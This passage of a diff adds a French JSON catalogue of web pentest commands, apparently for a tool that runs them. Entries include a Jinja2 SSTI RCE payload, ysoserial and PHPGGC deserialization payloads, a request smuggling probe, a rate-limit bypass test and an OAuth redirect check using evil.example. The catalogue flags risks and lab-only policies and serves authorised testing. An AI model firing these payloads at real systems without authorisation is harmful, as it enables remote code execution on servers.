+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "burp",
+        "proxy",
+        "mitm",
+        "web",
+        "intercept"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_038",
+      "name": "Nuclei — scan CVE critiques",
+      "short_name": "nuclei cves critical",
+      "description": "Lance tous les templates CVE de sévérité critique sur la cible",
+      "command": "nuclei -u http://$TARGET -t /root/nuclei-templates/cves/ -severity critical -rate-limit 50",
+      "purpose": "Détecter automatiquement les CVE critiques sur un service web",
+      "expected_output": "[critical] CVE-2022-XXXX found at http://TARGET",
+      "risks": "Élevé — scan actif, peut déclencher des alertes IDS",
+      "prerequisites": [
+        "nuclei installé",
+        "templates à jour avec nuclei -update-templates"
+      ],
+      "tool_required": "nuclei",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "nuclei",
+        "cve",
+        "web",
+        "critical",
+        "vuln"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_039",
+      "name": "Curl — HTTP Request Smuggling test",
+      "short_name": "http smuggling",
+      "description": "Teste le Request Smuggling CL.TE via un header Transfer-Encoding ambigu",
+      "command": "curl -s -X POST http://$TARGET/ -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' -d '0\\r\\n\\r\\nG'",
+      "purpose": "Détecter une vulnérabilité HTTP Request Smuggling",
+      "expected_output": "Réponse inattendue ou timeout indiquant une désynchronisation",
+      "risks": "Élevé — peut désynchroniser le backend et contourner des contrôles",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "smuggling",
+        "http",
+        "web",
+        "cl-te",
+        "proxy"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_040",
+      "name": "Arjun — découverte de paramètres cachés",
+      "short_name": "arjun params",
+      "description": "Découvre des paramètres HTTP cachés sur une page web",
+      "command": "arjun -u http://$TARGET/api/v1/users -m GET,POST",
+      "purpose": "Trouver des paramètres non documentés pouvant mener à des vulnérabilités",
+      "expected_output": "[+] Parameters found: debug=1, admin=true",
+      "risks": "Faible — requêtes HTTP multiples mais passives",
+      "prerequisites": [
+        "arjun installé (pip install arjun)"
+      ],
+      "tool_required": "arjun",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "params",
+        "api",
+        "web",
+        "recon",
+        "arjun"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_041",
+      "name": "SSTI — probe Jinja2/Twig générique",
+      "short_name": "ssti probe",
+      "description": "Teste une injection Server-Side Template Injection avec payload arithmétique non destructif",
+      "command": "curl -s 'http://$TARGET/search?q={{7*7}}' | grep -E '49|{{7\\*7}}'",
+      "purpose": "Confirmer rapidement si un paramètre est interprété par un moteur de template côté serveur.",
+      "expected_output": "49 dans la réponse si le payload est évalué côté serveur",
+      "risks": "Faible à moyen — injection applicative non destructive mais visible dans les logs.",
+      "prerequisites": [
+        "curl installé",
+        "paramètre HTTP candidat identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "ssti",
+        "template-injection",
+        "jinja2",
+        "twig",
+        "web"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_042",
+      "name": "SSTI — exploitation Jinja2 RCE lab",
+      "short_name": "ssti jinja2 rce",
+      "description": "Payload Jinja2 de commande système pour vérifier une RCE en environnement autorisé",
+      "command": "curl -s --get 'http://$TARGET/render' --data-urlencode 'tpl={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'",
+      "purpose": "Prouver une RCE via SSTI Jinja2 après confirmation d'une injection template.",
+      "expected_output": "uid=... gid=... dans la réponse",
+      "risks": "Critique — exécution de commande côté serveur. Strictement réservé au lab contrôlé.",
+      "prerequisites": [
+        "SSTI confirmée",
+        "moteur Jinja2 probable",
+        "autorisation explicite"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "ssti",
+        "jinja2",
+        "rce",
+        "web",
+        "lab"
+      ],
+      "execution_policy": "lab_only"
+    },
+    {
+      "id": "web_043",
+      "name": "GraphQL — batching abuse probe",
+      "short_name": "graphql batching",
+      "description": "Teste si l'API GraphQL accepte plusieurs opérations dans une seule requête",
+      "command": "curl -s -X POST http://$TARGET/graphql -H 'Content-Type: application/json' -d '[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]'",
+      "purpose": "Identifier le batching GraphQL, souvent utile pour contourner rate-limit ou accélérer l'énumération.",
+      "expected_output": "Tableau JSON contenant deux réponses GraphQL",
+      "risks": "Moyen — peut contourner des limites applicatives si abusé.",
+      "prerequisites": [
+        "curl installé",
+        "endpoint GraphQL identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": true,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "graphql",
+        "api",
+        "batching",
+        "rate-limit",
+        "web"
+      ],
+      "execution_policy": "normal"
+    },
+    {
+      "id": "web_044",
+      "name": "GraphQLmap — injection et enum GraphQL",
+      "short_name": "graphqlmap",
+      "description": "Lance GraphQLmap contre un endpoint pour tester injection, mutations et énumération",
+      "command": "python3 graphqlmap.py -u http://$TARGET/graphql --method POST --json",
+      "purpose": "Automatiser les tests GraphQL avancés après découverte du schéma.",
+      "expected_output": "Console GraphQLmap interactive avec champs et injections testables",
+      "risks": "Élevé — fuzzing applicatif actif, peut déclencher des mutations.",
+      "prerequisites": [
+        "GraphQLmap installé",
+        "endpoint GraphQL identifié",
+        "autorisation de test"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "graphql",
+        "graphqlmap",
+        "injection",
+        "api",
+        "web"
+      ],
+      "execution_policy": "lab_only"
+    },
+    {
+      "id": "web_045",
+      "name": "Ysoserial — payload Java désérialisation",
+      "short_name": "ysoserial java",
+      "description": "Génère un payload Java serialized pour tests de désérialisation en lab",
+      "command": "java -jar ysoserial-all.jar CommonsCollections1 'id' > /tmp/payload.ser",
+      "purpose": "Préparer une preuve de concept de désérialisation Java avant envoi contrôlé vers une application vulnérable.",
+      "expected_output": "/tmp/payload.ser généré",
+      "risks": "Critique si envoyé à une cible — peut exécuter une commande côté serveur.",
+      "prerequisites": [
+        "Java installé",
+        "ysoserial-all.jar disponible",
+        "gadget chain confirmée"
+      ],
+      "tool_required": "java",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "deserialization",
+        "java",
+        "ysoserial",
+        "rce",
+        "web"
+      ],
+      "execution_policy": "dry_run_only"
+    },
+    {
+      "id": "web_046",
+      "name": "PHPGGC — payload PHP désérialisation",
+      "short_name": "phpggc",
+      "description": "Génère une chaîne PHPGGC pour tester une désérialisation PHP vulnérable",
+      "command": "phpggc Laravel/RCE1 system 'id' --urlencode",
+      "purpose": "Produire un payload PHP serialized adapté à un framework/gadget chain identifié.",
+      "expected_output": "Payload URL-encodé à injecter dans le paramètre vulnérable",
+      "risks": "Critique si injecté — exécution de commande côté serveur.",
+      "prerequisites": [
+        "phpggc installé",
+        "framework et gadget chain identifiés",
+        "désérialisation confirmée"
+      ],
+      "tool_required": "phpggc",
+      "safe_to_run": false,
+      "dangerous": true,
+      "requires_sudo": false,
+      "tags": [
+        "deserialization",
+        "php",
+        "phpggc",
+        "rce",
+        "web"
+      ],
+      "execution_policy": "dry_run_only"
+    },
+    {
+      "id": "web_047",
+      "name": "OAuth — redirect_uri open redirect check",
+      "short_name": "oauth redirect",
+      "description": "Teste si un flow OAuth accepte une redirect_uri externe non autorisée",
+      "command": "curl -s -I 'http://$TARGET/oauth/authorize?client_id=$CLIENT_ID&response_type=code&redirect_uri=https://evil.example/callback&scope=openid'",
+      "purpose": "Détecter une mauvaise validation de redirect_uri pouvant exposer des codes OAuth.",
+      "expected_output": "302 Location: https://evil.example/callback?... indique une validation faible",
+      "risks": "Moyen — test de logique d'authentification, ne pas utiliser sur des comptes réels.",
+      "prerequisites": [
+        "curl installé",
+        "client_id OAuth de test",
+        "endpoint authorize identifié"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": false,
+      "requires_sudo": false,
+      "tags": [
+        "oauth",
+        "oidc",
+        "redirect-uri",
+        "auth",
+        "web"
+      ],
+      "execution_policy": "normal"
+    }
+  ]
+}
